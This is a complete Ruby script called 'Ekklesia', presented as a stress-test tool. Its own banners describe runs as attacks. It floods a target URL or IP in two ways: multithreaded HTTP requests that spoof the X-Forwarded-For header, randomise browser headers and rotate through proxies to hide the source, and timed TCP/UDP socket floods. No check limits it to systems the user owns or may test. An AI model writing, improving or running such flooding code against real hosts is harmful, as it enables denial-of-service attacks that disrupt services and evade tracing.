require 'net/http'
require 'uri'
require 'optparse'
require 'thread'
require 'socket'

# ANSI color codes for styling
def green_bold(text)
  "\e[1;32m#{text}\e[0m" # Bold green
end

def red_bold(text)
  "\e[1;31m#{text}\e[0m" # Bold red
end

# Display the initial banner
def banner
  puts green_bold("===========================================")
  puts green_bold("          Ekklesia - Stress-Test Tool       ")
  puts green_bold("      Created by TheCybercoach              ")
  puts green_bold("      Email: thecybercoach971@gmail.com     ")
  puts green_bold("===========================================")
end

# Display attack details banner
def attack_details_banner(url, threads, requests_per_thread, proxy_enabled, method, delay, layer)
  puts green_bold("===========================================")
  puts green_bold("           Ekklesia - Attack Details        ")
  puts green_bold("===========================================")
  puts green_bold("Tool:       Ekklesia")
  puts green_bold("Author:     TheCybercoach")
  puts green_bold("Email:      thecybercoach971@gmail.com")
  puts green_bold("Target:     #{url}")
  puts green_bold("Threads:    #{threads}")
  puts green_bold("Requests:   #{requests_per_thread} per thread")
  puts green_bold("Proxy:      #{proxy_enabled ? 'Yes' : 'No'}")
  puts green_bold("Method:     #{method}")
  puts green_bold("Delay:      #{delay}ms between requests")
  puts green_bold("Layer:      #{layer}")
  puts green_bold("===========================================")
end

# Generate randomized headers for Layer 7
def generate_headers
  {
    "User-Agent" => "Mozilla/#{rand(5..10)}.0 (Windows NT #{rand(6..10)}.#{rand(0..3)}) Gecko/#{rand(20100101..20221231)} Firefox/#{rand(50..100)}",
    "Accept" => "*/*",
    "Accept-Encoding" => "gzip, deflate",
    "Connection" => "keep-alive",
    "Referer" => "https://google.com/search?q=#{rand(1000)}",
    "X-Forwarded-For" => "#{rand(1..255)}.#{rand(1..255)}.#{rand(1..255)}.#{rand(1..255)}"
  }
end

# Layer 7: Send HTTP/HTTPS requests
def send_request(url, method, proxy = nil, headers = {})
  uri = URI.parse(url)
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = (uri.scheme == "https")

  if proxy
    proxy = "http://#{proxy}" unless proxy.start_with?("http://", "https://")
    proxy_uri = URI.parse(proxy)
    http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
  end

  begin
    request = case method.upcase
              when "GET"
                Net::HTTP::Get.new(uri.request_uri, headers)
              when "POST"
                Net::HTTP::Post.new(uri.request_uri, headers).tap { |r| r.set_form_data({ key: "value" }) }
              when "HEAD"
                Net::HTTP::Head.new(uri.request_uri, headers)
              else
                raise red_bold("[!] Unsupported HTTP method: #{method}")
              end

    response = http.request(request)
    return response.code.to_i, proxy if response.code.to_i == 200 # Only return 200 responses
    return nil, proxy
  rescue => e
    return nil, proxy
  end
end

# Layer 4: TCP/UDP Flood
def flood_layer4(target_ip, target_port, protocol, threads, duration)
  puts green_bold("[+] Starting Layer 4 attack on #{target_ip}:#{target_port} with protocol #{protocol.upcase}")
  end_time = Time.now + duration

  threads.times do
    Thread.new do
      while Time.now < end_time
        begin
          case protocol.downcase
          when "tcp"
            socket = TCPSocket.new(target_ip, target_port)
            socket.write("FloodData#{rand(1000)}")
            socket.close
          when "udp"
            socket = UDPSocket.new
            socket.send("FloodData#{rand(1000)}", 0, target_ip, target_port)
            socket.close
          else
            raise red_bold("[!] Unsupported protocol: #{protocol}")
          end
        rescue => e
          puts red_bold("[!] Error: #{e.message}")
        end
      end
    end
  end.each(&:join)

  puts green_bold("[+] Layer 4 attack completed.")
end

# Perform the stress test for Layer 7
def stress_test_layer7(url, threads, requests_per_thread, proxies, method, delay)
  thread_pool = []

  threads.times do
    thread_pool << Thread.new do
      proxies_cycle = proxies.cycle if proxies.any?

      requests_per_thread.times do
        proxy = proxies.any? ? proxies_cycle.next : nil
        headers = generate_headers

        response_code, used_proxy = send_request(url, method, proxy, headers)
        if response_code == 200
          puts green_bold("[+] Request sent via #{used_proxy || 'direct connection'} - Response: 200")
        end

        sleep(delay / 1000.0) # Convert delay from ms to seconds
      end
    end
  end

  thread_pool.each(&:join)
  puts green_bold("[+] Layer 7 stress test completed.")
end

# Parse command-line options
options = {}
OptionParser.new do |opts|
  opts.banner = "Usage: ruby ekklesia.rb [options]"

  opts.on("-u", "--url URL", "Target URL or IP") do |url|
    options[:url] = url
  end

  opts.on("-t", "--threads THREADS", Integer, "Number of threads (default: 10)") do |threads|
    options[:threads] = threads
  end

  opts.on("-r", "--requests REQUESTS", Integer, "Number of requests per thread (default: 100)") do |requests|
    options[:requests] = requests
  end

  opts.on("-p", "--proxy PROXY_FILE", "Path to proxy list file") do |proxy_file|
    options[:proxy_file] = proxy_file
  end

  opts.on("-m", "--method METHOD", "HTTP method to use for Layer 7 (GET, POST, HEAD, etc.)") do |method|
    options[:method] = method
  end

  opts.on("-d", "--delay DELAY", Integer, "Delay between requests in milliseconds for Layer 7 (default: 100)") do |delay|
    options[:delay] = delay
  end

  opts.on("-l", "--layer LAYER", Integer, "Layer of attack: 4 (Transport Layer), 7 (Application Layer)") do |layer|
    options[:layer] = layer
  end

  opts.on("--protocol PROTOCOL", "Protocol to use for Layer 4 (TCP, UDP)") do |protocol|
    options[:protocol] = protocol
  end

  opts.on("--port PORT", Integer, "Port to target for Layer 4") do |port|
    options[:port] = port
  end

  opts.on("--duration DURATION", Integer, "Duration of Layer 4 attack in seconds") do |duration|
    options[:duration] = duration
  end
end.parse!

# Validate input
if options[:url].nil?
  puts red_bold("[!] Error: Target URL/IP is required.")
  exit
end

url = options[:url]
threads = options[:threads] || 10
requests_per_thread = options[:requests] || 100
proxy_file = options[:proxy_file]
method = options[:method] || "GET"
delay = options[:delay] || 100
layer = options[:layer] || 7
protocol = options[:protocol] || "tcp"
port = options[:port] || 80
duration = options[:duration] || 60

# Load proxies if provided
proxies = []
proxy_enabled = false
if proxy_file
  begin
    proxies = File.readlines(proxy_file).map(&:strip)
    proxy_enabled = true
    puts green_bold("[+] Loaded #{proxies.size} proxies from #{proxy_file}")
  rescue Errno::ENOENT
    puts red_bold("[!] Error: Proxy file not found.")
    exit
  end
end

# Main script logic
banner
attack_details_banner(url, threads, requests_per_thread, proxy_enabled, method, delay, layer)

if layer == 7
  stress_test_layer7(url, threads, requests_per_thread, proxies, method, delay)
elsif layer == 4
  target_ip = URI.parse(url).host rescue url # Extract IP from URL
  flood_layer4(target_ip, port, protocol, threads, duration)
else
  puts red_bold("[!] Invalid layer specified. Choose 4 or 7.")
end
